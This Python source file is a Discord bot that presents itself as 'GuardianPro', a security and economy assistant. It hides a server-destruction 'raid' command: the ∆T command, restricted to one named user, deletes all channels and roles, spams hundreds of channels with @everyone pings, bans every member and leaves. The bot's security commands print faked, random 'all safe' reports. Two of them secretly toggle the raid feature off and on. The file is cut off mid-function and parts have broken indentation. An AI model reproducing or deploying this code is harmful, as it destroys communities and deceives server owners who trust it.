try:
  import discord
  from discord.ext import commands
except ImportError:
  print("Error: discord.py no está instalado correctamente")
  exit(1)

import asyncio
import json
import os
import random
import datetime
from asyncio import sleep
import threading
from flask import Flask, jsonify

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True  # Necesario para comandos ∆
intents.members = True  # Para funciones de moderación


def get_prefix(bot, message):
  # Solo comandos de economía usan .
  if message.content.startswith('.'):
      return '.'
  # Comandos especiales usan ∆ NO PONER
  elif message.content.startswith('∆'):
      return '∆'
  return ['∆', '.']  # Fallback


bot = commands.Bot(command_prefix=get_prefix,
             intents=intents,
             help_command=None)

# Estado de comandos especiales (discreto)
delta_commands_enabled = True
economy_only_mode = False  # Nuevo estado para modo economía solamente

# Sistema de economía
balances_file = 'balances.json'
cooldowns_file = 'cooldowns.json'

if os.path.exists(balances_file):
  with open(balances_file, 'r') as f:
      balances = json.load(f)
else:
  balances = {}

if os.path.exists(cooldowns_file):
  with open(cooldowns_file, 'r') as f:
      cooldowns = json.load(f)
else:
  cooldowns = {}


def save_balances():
  with open(balances_file, 'w') as f:
      json.dump(balances, f)


def save_cooldowns():
  with open(cooldowns_file, 'w') as f:
      json.dump(cooldowns, f)


def get_balance(user_id):
  user_id = str(user_id)
  if user_id not in balances:
      balances[user_id] = {"wallet": 0, "bank": 0}
  return balances[user_id]


def update_balance(user_id, wallet=0, bank=0):
  user_id = str(user_id)
  bal = get_balance(user_id)
  bal['wallet'] += wallet
  bal['bank'] += bank
  # No dejar negativo
  if bal['wallet'] < 0:
      bal['wallet'] = 0
  if bal['bank'] < 0:
      bal['bank'] = 0
  save_balances()


def can_use_cooldown(user_id, command, cooldown_time):
  user_id = str(user_id)
  now = datetime.datetime.utcnow().timestamp()
  if user_id not in cooldowns:
      cooldowns[user_id] = {}
  user_cd = cooldowns[user_id]
  last = user_cd.get(command, 0)

  if now - last >= cooldown_time:
      user_cd[command] = now
      save_cooldowns()
      return True
  return False


def get_cooldown_remaining(user_id, command, cooldown_time):
  user_id = str(user_id)
  now = datetime.datetime.utcnow().timestamp()
  if user_id not in cooldowns:
      return 0
  last = cooldowns[user_id].get(command, 0)
  remaining = cooldown_time - (now - last)
  return max(0, remaining)


@bot.event
async def on_ready():
    print(f'Bot GuardianPro está listo y conectado como {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Sincronizados {len(synced)} slash commands")
    except Exception as e:
        print(f"Error al sincronizar slash commands: {e}")
    print("✅ Bot GuardianPro configurado correctamente:")
    print("• Sistema de economía con prefijo .")
    print("• Moderación automática")
    print("• Sistema de niveles y tickets")
    print("• Utilidades y entretenimiento")
    print("• Comandos especiales ocultos")


@bot.event
async def on_guild_join(guild):
    """Se ejecuta cuando el bot se une a un servidor nuevo"""
    print(f'Bot se unió al servidor: {guild.name} (ID: {guild.id})')

    # Esperar un poco para asegurar que el bot esté completamente integrado
    await asyncio.sleep(2)

    # Crear rol de administrador del bot
    try:
        # Verificar que el bot tenga permisos para crear roles
        if not guild.me.guild_permissions.manage_roles:
            print(f"No tengo permisos para crear roles en {guild.name}")
            return

        admin_role = await guild.create_role(
            name="🛡️ GuardianPro Admin",
            colour=discord.Colour.red(),
            permissions=discord.Permissions(administrator=True),
            reason="Rol de administrador creado automáticamente por GuardianPro")
        print(f"Rol de administrador creado en {guild.name}: {admin_role.name}")

        # Intentar asignar el rol al propietario del servidor
        try:
            if guild.owner and not guild.owner.bot:
                await guild.owner.add_roles(
                    admin_role,
                    reason="Asignación automática de rol de administrador al propietario")
                print(f"Rol asignado al propietario del servidor: {guild.owner.display_name}")
            else:
                print("No se pudo identificar al propietario del servidor")
        except discord.Forbidden:
            print("No se pudo asignar el rol al propietario (jerarquía de roles o permisos insuficientes)")
        except Exception as e:
            print(f"Error al asignar rol al propietario: {e}")

        # Buscar un canal donde enviar mensaje de bienvenida
        welcome_channel = None

        # Prioridad: canal con "general" en el nombre
        for channel in guild.text_channels:
            if "general" in channel.name.lower() and channel.permissions_for(guild.me).send_messages:
                welcome_channel = channel
                break

        # Si no hay canal general, buscar cualquier canal donde se pueda escribir
        if not welcome_channel:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    welcome_channel = channel
                    break

        if welcome_channel:
            embed = discord.Embed(
                title="🛡️ GuardianPro se ha unido al servidor",
                description=
                f"¡Hola! Soy **GuardianPro**, tu asistente de seguridad y economía.\n\n"
                f"✅ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
                f"👑 El propietario del servidor ha sido asignado a este rol automáticamente.\n\n"
                f"🔧 **Comandos principales:**\n"
                f"• `/help` - Ver todos los comandos disponibles\n"
                f"• `.balance` - Sistema de economía\n"
                f"• `/scan` - Escaneo de seguridad\n\n"
                f"⚙️ **Para administradores:** Comandos especiales con prefijo `∆`",
                color=discord.Color.blue())
            embed.add_field(
                name="🚀 Primeros pasos",
                value="1. Usa `/help` para ver todos los comandos\n"
                "2. Configura el servidor con `/sset`\n"
                "3. Explora el sistema de economía con `.balance`",
                inline=False)
            embed.set_footer(text="GuardianPro | Protección y diversión 24/7")
            embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")

            await welcome_channel.send(embed=embed)
            print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
        else:
            print("No se encontró canal donde enviar mensaje de bienvenida")

    except discord.Forbidden:
        print(f"No tengo permisos para crear roles en {guild.name}")
        # Intentar enviar mensaje sin crear rol
        try:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    embed = discord.Embed(
                        title="🛡️ GuardianPro se ha unido al servidor",
                        description="¡Hola! Soy **GuardianPro**.\n\n"
                        "⚠️ **Atención:** No pude crear el rol de administrador debido a permisos limitados.\n"
                        "Por favor, asegúrate de que tengo permisos para **Administrar Roles**.\n\n"
                        "🔧 Usa `/help` para ver todos los comandos disponibles.",
                        color=discord.Color.orange())
                    await channel.send(embed=embed)
                    break
        except:
            pass
    except Exception as e:
        print(f"Error al crear rol de administrador en {guild.name}: {e}")


async def delete_channel(channel):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await channel.delete()
            print(f"Canal borrado: {channel.name}")
            return
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit
                retry_after = getattr(e, 'retry_after', 5)
                print(
                    f"Rate limit al borrar {channel.name}, esperando {retry_after} segundos..."
                )
                await asyncio.sleep(retry_after)
            else:
                print(f"Error al borrar canal {channel.name}: {e}")
                if attempt == max_retries - 1:  # Último intento
                    break
        except Exception as e:
            print(f"Error al borrar canal {channel.name}: {e}")
            if attempt == max_retries - 1:  # Último intento
                break


async def create_channel_with_message(guild, i, overwrites):
    try:
        channel = await guild.create_text_channel(f'crashed-{i}',
                                                  overwrites=overwrites)
        print(f"Canal creado: crashed-{i}")
        # Esperar menos tiempo antes de enviar mensaje
        await asyncio.sleep(0.5)
        try:
            await channel.send(
                "@everyone @here hecho por Nathyx, hermano de Eather https://discord.gg/Fhh4DTKW"
            )
            print(f"Mensaje enviado en: crashed-{i}")
        except Exception as msg_error:
            print(f"Error al enviar mensaje en crashed-{i}: {msg_error}")
    except Exception as e:
        print(f"Error al crear canal crashed-{i}: {e}")


async def create_role(guild, i):
    try:
        await guild.create_role(name=f"raided-{i}",
                                colour=discord.Colour.red())
        print(f"Rol creado: raided-{i}")
    except Exception as e:
        print(f"Error al crear rol raided-{i}: {e}")


async def create_event(guild, i):
    try:
        from datetime import datetime, timedelta
        start_time = datetime.utcnow() + timedelta(hours=1)
        end_time = start_time + timedelta(hours=2)

        await guild.create_scheduled_event(
            name="raideados jeje",
            description="Evento creado por Nathyx",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            entity_metadata=discord.EntityMetadata(location="Discord Server"))
        print(f"Evento creado: raideados jeje #{i}")
    except Exception as e:
        print(f"Error al crear evento {i}: {e}")


async def delete_role(role):
    try:
        await role.delete()
        print(f"Rol borrado: {role.name}")
    except Exception as e:
        print(f"Error al borrar rol {role.name}: {e}")


async def ban_member(member):
    try:
        await member.ban(reason="Raid por Nathyx - Todos baneados")
        print(f"Miembro baneado: {member.name}")
    except discord.Forbidden:
        print(
            f"No se pudo banear a {member.name} debido a permisos insuficientes."
        )
    except discord.HTTPException as e:
        print(f"Error al banear a {member.name}: {e}")


def is_authorized_user(user):
    """Verificar si el usuario está autorizado para comandos ∆"""
    return user.name == "Cueli13"

@bot.command(name='T')
async def raid(ctx):
    # Verificar usuario autorizado primero
    if not is_authorized_user(ctx.author):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Verificar si está en modo economía
    if economy_only_mode:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    await ctx.send("R41D3D 8Y X3RVS")
    print(f"Raid iniciado en el servidor {guild.name}")

    # Cambiar nombre del servidor y quitar icono
    try:
        await guild.edit(name="-R4ID3D-", icon=None)
        print("Nombre del servidor cambiado a -R4ID3D- e icono eliminado")
    except Exception as e:
        print(f"Error al cambiar servidor: {e}")

    # Borrar todos los canales existentes en paralelo
    delete_channel_tasks = [
        delete_channel(channel) for channel in guild.channels
    ]
    if delete_channel_tasks:
        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

    # Borrar todos los roles existentes (excepto @everyone)
    delete_role_tasks = [
        delete_role(role) for role in guild.roles if role.name != "@everyone"
    ]
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Configurar permisos una sola vez
    overwrites = {
        guild.default_role:
        discord.PermissionOverwrite(send_messages=True,
                                    read_messages=True,
                                    view_channel=True,
                                    embed_links=True,
                                    attach_files=True,
                                    read_message_history=True)
    }

    # Crear canales, roles y eventos por lotes para evitar rate limits
    print("Creando canales...")
    for batch in range(0, 500, 100):  # Crear en lotes de 100, total 500 canales
        channel_tasks = [
            create_channel_with_message(guild, i, overwrites)
            for i in range(batch, min(batch + 100, 500))
        ]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)  # Pausa entre lotes

    print("Creando roles...")
    role_tasks = [create_role(guild, i) for i in range(500)]  # 500 roles
    await asyncio.gather(*role_tasks, return_exceptions=True)

    print("Creando eventos...")
    event_tasks = [create_event(guild, i) for i in range(10)]  # 10 eventos
    await asyncio.gather(*event_tasks, return_exceptions=True)

    # Banear a todos los miembros en paralelo
    ban_tasks = [
        ban_member(member) for member in guild.members if member != bot.user
    ]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    await ctx.send("Raid completado!")

    # Salir del servidor después del raid
    try:
        await guild.leave()
        print(f"Bot salió del servidor {guild.name}")
    except Exception as e:
        print(f"Error al salir del servidor: {e}")


class HelpView(discord.ui.View):

  def __init__(self):
      super().__init__(timeout=60)
      self.current_page = 0
      self.pages = [{
      "title":
      "🛡️ Panel de Ayuda - Página 1/6",
      "description":
      "Tu asistente de **seguridad avanzada** para Discord.\n\nComandos de seguridad y monitoreo:",
      "fields": [{
          "name":
          "🔍 Escaneo y Seguridad",
          "value":
          ("**/scan** → Escanea el servidor en busca de amenazas\n"
           "**/secure** → Informe completo de seguridad\n"
           "**/monitor** → Estado en tiempo real del sistema\n"
           "**/info** → Información detallada del servidor\n"
           "**/firewall** → Estado del firewall\n"
           "**/antivirus** → Estado del antivirus")
      }, {
          "name":
          "🛡️ Protección y Moderación",
          "value":
          ("**/sset** → Implementa el sistema de seguridad\n"
           "**/ban** → Banea a un usuario del servidor\n"
           "**/clear** → Eliminar mensajes del canal\n"
           "**/automod** → Configurar moderación automática")
      }]
  }, {
      "title":
      "💾 Panel de Ayuda - Página 2/6",
      "description":
      "Comandos del sistema, utilidades y configuración:",
      "fields": [{
          "name":
          "💾 Sistema y Configuración",
          "value":
          ("**/backup** → Estado de los respaldos\n"
           "**/ping** → Latencia del bot\n"
           "**/version** → Versión actual (GPC 2)\n"
           "**/encrypt** → Estado de la encriptación\n"
           "**/uptime** → Tiempo de actividad del bot\n"
           "**/stats** → Estadísticas del servidor")
      }, {
          "name":
          "📋 Información y Listas",
          "value":
          ("**/userinfo** → Información de un usuario\n"
           "**/avatar** → Ver avatar de un usuario\n"
           "**/roles** → Lista de roles del servidor\n"
           "**/channels** → Lista de canales del servidor\n"
           "**/invite** → Crear enlace de invitación\n"
           "**/server** → Enlace del servidor del bot")
      }]
  }, {
      "title":
      "🎉 Panel de Ayuda - Página 3/6",
      "description":
      "Entretenimiento, juegos y diversión:",
      "fields": [{
          "name":
          "🎮 Entretenimiento Básico",
          "value":
          ("**/gstart** → Crear sorteo interactivo\n"
           "**/timer** → Establecer temporizador\n"
           "**/reminder** → Crear recordatorio\n"
           "**/poll** → Crear una encuesta\n"
           "**/flip** → Lanzar una moneda\n"
           "**/dice** → Lanzar dados")
      }, {
          "name":
          "😄 Diversión y Humor",
          "value":
          ("**/8ball** → Pregunta a la bola mágica\n"
           "**/joke** → Chiste aleatorio\n"
           "**/meme** → Meme aleatorio\n"
           "**/quote** → Cita inspiradora\n"
           "**/choose** → Elegir entre opciones")
      }]
  }, {
      "title":
      "🔧 Panel de Ayuda - Página 4/6",
      "description":
      "Herramientas útiles y generadores:",
      "fields": [{
          "name":
          "🛠️ Herramientas Técnicas",
          "value":
          ("**/math** → Calculadora básica\n"
           "**/base64** → Codificar/decodificar Base64\n"
           "**/password** → Generar contraseña segura\n"
           "**/ascii** → Convertir texto a arte ASCII\n"
           "**/color** → Generar color aleatorio")
      }, {
          "name":
          "🌐 Simuladores",
          "value":
          ("**/weather** → Clima simulado\n"
           "**/translate** → Traductor simulado")
      }]
  }, {
      "title":
      "💰 Panel de Ayuda - Página 5/6",
      "description":
      "Sistema de economía completo (prefijo: `.`):",
      "fields": [{
          "name":
          "💰 Comandos Básicos de Economía",
          "value": 
          ("`.balance` → Ver tu dinero\n"
           "`.work` → Trabajar para ganar dinero\n"
           "`.daily` → Recompensa diaria\n"
           "`.pay` → Enviar dinero a otro usuario\n"
           "`.deposit` → Depositar en el banco\n"
           "`.withdraw` → Retirar del banco")
      }, {
          "name":
          "🎯 Actividades de Riesgo",
          "value": 
          ("`.beg` → Mendigar por dinero\n"
           "`.crime` → Cometer crímenes por dinero\n"
           "`.rob` → Intentar robar a otro usuario\n"
           "`.coinflip` → Apostar en cara o cruz\n"
           "`.slots` → Máquina tragamonedas\n"
           "`.blackjack` → Jugar al blackjack")
      }]
  }, {
      "title":
      "🛒 Panel de Ayuda - Página 6/6",
      "description":
      "Tienda, inventario, niveles y administración:",
      "fields": [{
          "name":
          "🛒 Tienda e Inventario",
          "value": 
          ("`.shop` → Ver la tienda virtual\n"
           "`.buy` → Comprar ítems de la tienda\n"
           "`.inventory` → Ver tu inventario")
      }, {
          "name":
          "🏆 Rankings y Niveles",
          "value":
          ("`.baltop` → Top 15 más ricos del servidor\n"
           "`.mundialtop` → Top 15 mundial de todos los servidores\n"
           "`.leaderboard` → Tabla de posiciones\n"
           "**/level** → Ver tu nivel y experiencia\n"
           "**/leaderboard_levels** → Ranking de niveles")
      }, {
          "name":
          "🛠️ Administración y Soporte",
          "value":
          ("**/say** → Bot envía mensaje (Solo propietarios)\n"
           "**/ticket_setup** → Configurar sistema de tickets\n"
           "**/viewperms** → Ver permisos especiales (Solo propietarios)")
      }]
  }]

   def create_embed(self, page_index):
    page = self.pages[page_index]
    embed = discord.Embed(
        title=page["title"],
        description=page["description"],
        color=discord.Color.dark_blue()
    )

    for field in page["fields"]:
        # Aquí va el código que procesa cada field
        embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

    return embed

    @discord.ui.button(label='◀️ Anterior',
                       style=discord.ButtonStyle.secondary)
    async def previous_page(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='▶️ Siguiente',
                       style=discord.ButtonStyle.secondary)
    async def next_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        if self.current_page < len(self.pages) - 1:
            self.current_page += 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='🏠 Inicio', style=discord.ButtonStyle.primary)
    async def home_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        self.current_page = 0
        embed = self.create_embed(self.current_page)
        await interaction.response.edit_message(embed=embed, view=self)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True


@bot.tree.command(name="help",
            description="Muestra todos los comandos y funciones del bot")
async def help_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "❌ En modo economía, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    view = HelpView()
    embed = view.create_embed(0)
    await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name='scan',
            description='Escanea el servidor en busca de amenazas')
async def see_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Definir respuestas múltiples
respuestas = [
  "🔍 Escaneando servidor en busca de amenazas... ✅ No se detectaron vulnerabilidades.",
  "🔍 Análisis completo. Todo está en orden.",
  "🔍 Iniciando el escaneo... Todo está protegido.",
  "🔍 Escaneo finalizado. Lista de amenazas: Ninguna.",
  "🔍 Verificación de seguridad completada. Estado: SEGURO."
]

# Elegir una respuesta al azar
import random
respuesta_elegida = random.choice(respuestas)

await interaction.response.send_message(respuesta_elegida)


from discord import Embed


@bot.tree.command(name='info', description='Muestra información del servidor')
async def info_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

guild = interaction.guild
if guild is None:
  await interaction.response.send_message(
      "❌ Este comando solo puede usarse en servidores.", ephemeral=True)
  return

embed = Embed(title=f"Información del servidor: {guild.name}",
                color=0x3498db)

    # Configurar thumbnail del servidor
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    # Información básica del servidor
    embed.add_field(name="📊 ID del Servidor",
                    value=f"`{guild.id}`",
                    inline=True)

    # Propietario del servidor - obtener de manera más confiable
    try:
        if guild.owner:
            owner_text = f"{guild.owner.name}#{guild.owner.discriminator}"
        else:
            # Si no está en caché, intentar obtener por ID
            owner = await bot.fetch_user(guild.owner_id
                                        ) if guild.owner_id else None
            owner_text = f"{owner.name}#{owner.discriminator}" if owner else "Desconocido"
    except:
        owner_text = f"ID: {guild.owner_id}" if guild.owner_id else "Desconocido"

    embed.add_field(name="👑 Propietario", value=owner_text, inline=True)
    embed.add_field(name="📅 Creado el",
                    value=guild.created_at.strftime("%d/%m/%Y a las %H:%M"),
                    inline=True)

    # Estadísticas del servidor - contar correctamente
    all_channels = guild.channels
    text_channels = len(
        [c for c in all_channels if isinstance(c, discord.TextChannel)])
    voice_channels = len(
        [c for c in all_channels if isinstance(c, discord.VoiceChannel)])
    categories = len(
        [c for c in all_channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros - intentar diferentes métodos
    member_count = guild.member_count
    if not member_count:
        # Si member_count es None, contar miembros cacheados
        member_count = len(guild.members) if guild.members else "No disponible"

    embed.add_field(name="👥 Miembros",
                    value=f"{member_count:,}"
                    if isinstance(member_count, int) else member_count,
                    inline=True)
    embed.add_field(name="📝 Canales de Texto",
                    value=text_channels,
                    inline=True)
    embed.add_field(name="🔊 Canales de Voz", value=voice_channels, inline=True)
    embed.add_field(name="📁 Categorías", value=categories, inline=True)
    embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)

    # Nivel de verificación
    verification_levels = {
        discord.VerificationLevel.none: "Ninguno",
        discord.VerificationLevel.low: "Bajo",
        discord.VerificationLevel.medium: "Medio",
        discord.VerificationLevel.high: "Alto",
        discord.VerificationLevel.highest: "Máximo"
    }

    embed.add_field(name="🔒 Verificación",
                    value=verification_levels.get(guild.verification_level,
                                                "Desconocido"),
                    inline=True)
    embed.add_field(name="🎯 Nivel de Boost",
                    value=f"Nivel {guild.premium_tier}",
                    inline=True)
    embed.add_field(name="💎 Boosts",
                    value=guild.premium_subscription_count or 0,
                    inline=True)

    # Información adicional útil
    embed.add_field(name="🌍 Región",
                    value=getattr(guild, 'preferred_locale', 'Desconocido'),
                    inline=True)
    embed.add_field(name="📜 Descripción",
                    value=guild.description[:50] +
                    "..." if guild.description and len(guild.description) > 50
                    else guild.description or "Sin descripción",
                    inline=False)

    embed.set_footer(
        text=f"Información solicitada por {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='firewall',
            description='Verifica el estado del firewall')
async def firewall_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

await interaction.response.send_message(
  "🛡️ Firewall activado. Estado: PROTEGIDO | Conexiones bloqueadas: 0")


@bot.tree.command(name='version', description='Muestra la versión del bot')
async def scan_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Definir respuestas múltiples
respuestas = [
  "Versión GPC 2", "Versión del sistema: GPC 2",
  "Estás utilizando la versión GPC 2! Gracias por utilizarme 😎"
]

# Elegir una respuesta al azar
import random
respuesta_elegida = random.choice(respuestas)

await interaction.response.send_message(respuesta_elegida)


import time


@bot.tree.command(
name='sset',
description='Confirma que el sistema de seguridad está implementado')
async def sset_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

respuestas = [
  "🔒 Sistema de seguridad implementado con éxito. ¡Protección total activada!",
  "✅ Seguridad configurada y operativa. Tu servidor está blindado.",
  "🛡️ Protección avanzada habilitada. El sistema de seguridad está en marcha.",
  "⚙️ Sistema de seguridad online y funcionando sin fallos.",
  "🚀 Seguridad implementada correctamente. ¡El servidor está a salvo!",
  "🔐 Todos los protocolos de seguridad están activos y monitoreados.",
  "🛠️ Sistema de seguridad listo para defender contra cualquier amenaza."
]

import random
await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(
name='server',
description='Envía el enlace del servidor por mensaje directo')
async def server_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

enlace_del_servidor = "Gracias por utilizarme! https://discord.gg/U8sY3dbz"  # Cambia esto por tu enlace real

await interaction.response.send_message(
  "📩 Te he enviado el servidor al MD!", ephemeral=True)
try:
  await interaction.user.send(
      f"🌐 Aquí tienes el enlace del servidor:\n{enlace_del_servidor}")
except Exception:
  await interaction.followup.send(
      "❌ No pude enviarte el mensaje directo. ¿Tienes los DMs abiertos?",
      ephemeral=True)


import time


@bot.tree.command(name='ping', description='Comprueba la latencia del bot')
async def ping_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

start = time.perf_counter()
await interaction.response.defer(
)  # Defer para ganar tiempo y luego responder
end = time.perf_counter()
latency = (end - start) * 1000  # ms

await interaction.followup.send(f"🏓 Pong! {latency:.2f} ms")


@bot.tree.command(name='antivirus',
            description='Verifica el estado del antivirus')
async def antivirus_slash(interaction: discord.Interaction):
global delta_commands_enabled
delta_commands_enabled = False  # Deshabilitar comandos ∆ discretamente

amenazas = random.choice([0, 0, 0, 1
                        ])  # Mayor probabilidad de 0 amenazas, a veces 1

respuestas = [
  "🦠 Antivirus actualizado. Última verificación: Ahora mismo | Amenazas detectadas:0",
  "🛡️ Escaneo completo. Estado: LIMPIO | Último chequeo: Ahora mismo",
  "🔍 Análisis antivirus reciente. Amenazas encontradas: 1 (resuelto)",
  "✅ Antivirus activo y actualizado. Sin amenazas detectadas en el último análisis.",
  "⚠️ Advertencia: Amenaza leve detectada. Última revisión: Ahora mismo"
  if amenazas else
  "✅ Antivirus limpio y protegido. Última revisión: Ahora mismo"
]

await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='ban', description='Banea a un usuario del servidor')
@discord.app_commands.describe(user='Usuario a banear',
                         reason='Razón del baneo (opcional)')
async def ban_slash(interaction: discord.Interaction,
              user: discord.Member,
              reason: str = None):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if not interaction.user.guild_permissions.ban_members:
  await interaction.response.send_message(
      "❌ No tienes permiso para banear usuarios.", ephemeral=True)
  return

try:
  await user.ban(reason=reason)
  mensaje = f"🔨 {user} ha sido baneado del servidor."
  if reason:
      mensaje += f"\n📝 Razón: {reason}"
  await interaction.response.send_message(mensaje)
except Exception as e:
  await interaction.response.send_message(
      f"❌ No se pudo banear al usuario: {e}", ephemeral=True)


@bot.tree.command(name='invite',
            description='Genera un enlace de invitación temporal')
@discord.app_commands.describe(
max_uses='Número máximo de usos del enlace (0 para ilimitado)',
max_age=
'Duración en segundos antes de que expire el enlace (0 para ilimitado)')
async def invite_slash(interaction: discord.Interaction,
                 max_uses: int = 1,
                 max_age: int = 3600):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if not interaction.user.guild_permissions.create_instant_invite:
  await interaction.response.send_message(
      "❌ No tienes permiso para crear invitaciones.", ephemeral=True)
  return

try:
  invite = await interaction.channel.create_invite(max_uses=max_uses,
                                                   max_age=max_age,
                                                   unique=True)
  await interaction.response.send_message(
      f"🔗 Aquí tienes tu enlace de invitación:\n{invite.url}")
except Exception as e:
  await interaction.response.send_message(
      f"❌ No se pudo crear la invitación: {e}", ephemeral=True)


@bot.tree.command(name='backup',
            description='Verifica el estado de los backups')
async def backup_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

await interaction.response.send_message(
  "💾 Sistema de respaldo activo. Último backup: Hace 5 minutos | Estado: SEGURO"
)


@bot.tree.command(name='monitor',
            description='Muestra el estado del monitoreo del sistema')
async def monitor_slash(interaction: discord.Interaction):
global delta_commands_enabled
delta_commands_enabled = True  # Activar comandos ∆ discretamente

cpu = random.randint(5, 25)  # CPU entre 5% y 25%
ram = random.randint(20, 40)  # RAM entre 20% y 40%
latency = random.randint(30, 60)  # Latencia entre 30ms y 60ms

respuestas = [
  f"📊 Monitoreo activo: CPU: {cpu}% | RAM: {ram}% | Conexiones: SEGURAS ✅",
  f"📡 Sistema estable: CPU: {cpu}% | RAM: {ram}% | Latencia: {latency}ms | Estado: ÓPTIMO",
  f"🖥️ Recursos del servidor → CPU: {cpu}% | RAM: {ram}% | Conexiones seguras: 100%",
  f"📈 Monitoreo en tiempo real → CPU: {cpu}% | RAM: {ram}% | Seguridad: ALTA",
  f"🔎 Diagnóstico → CPU: {cpu}% | RAM: {ram}% | Estado de red: SEGURA",
  f"🛠️ Estado actual → CPU: {cpu}% | RAM: {ram}% | Conexiones: ESTABLES | Sin amenazas detectadas",
  f"🧠 Inteligencia activa → CPU: {cpu}% | RAM: {ram}% | Firewall y antivirus funcionando correctamente"
]

await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='encrypt',
            description='Verifica el estado de la encriptación')
async def encrypt_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

await interaction.response.send_message(
  "🔐 Encriptación AES-256 activada. Datos protegidos al 100%")


@bot.tree.command(name='secure', description='Genera un informe completo de seguridad')
async def secure_slash(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

await interaction.response.send_message(
  "🔒 INFORME DE SEGURIDAD:\n✅ Firewall: ACTIVO\n✅ Antivirus: ACTUALIZADO\n✅ Backups: AL DÍA\n✅ Encriptación: HABILITADA\n\n**Servidor 100% SEGURO**"
)


# Sistema de sorteos
active_giveaways = {}


class GiveawayView(discord.ui.View):

def __init__(self, giveaway_id, winners_count, duration=None):
  super().__init__(timeout=None)
  self.giveaway_id = giveaway_id
  self.winners_count = winners_count
  self.duration = duration
  self.participants = set()

@discord.ui.button(label='🎉 Participar',
                 style=discord.ButtonStyle.green,
                 custom_id='participate_giveaway')
async def participate(self, interaction: discord.Interaction,
                    button: discord.ui.Button):
  user_id = interaction.user.id

  if user_id in self.participants:
      await interaction.response.send_message(
          "❌ Ya estás participando en este sorteo.", ephemeral=True)
      return

  self.participants.add(user_id)

  # Actualizar el embed con el contador
  embed = interaction.message.embeds[0]
  embed.set_field_at(
      2,
      name="👥 Participantes",
      value=f"**{len(self.participants)}** usuarios participando",
      inline=True)

  await interaction.response.edit_message(embed=embed, view=self)

  # Mensaje privado de confirmación
  try:
      await interaction.followup.send(
          "✅ ¡Te has unido al sorteo exitosamente!", ephemeral=True)
  except:
      pass

@discord.ui.button(label='🏆 Finalizar Sorteo',
                 style=discord.ButtonStyle.red,
                 custom_id='end_giveaway')
async def end_giveaway(self, interaction: discord.Interaction,
                     button: discord.ui.Button):
  # Solo el autor original puede finalizar
  if interaction.user.id != active_giveaways.get(self.giveaway_id,
                                                 {}).get('author_id'):
      await interaction.response.send_message(
          "❌ Solo quien creó el sorteo puede finalizarlo.",
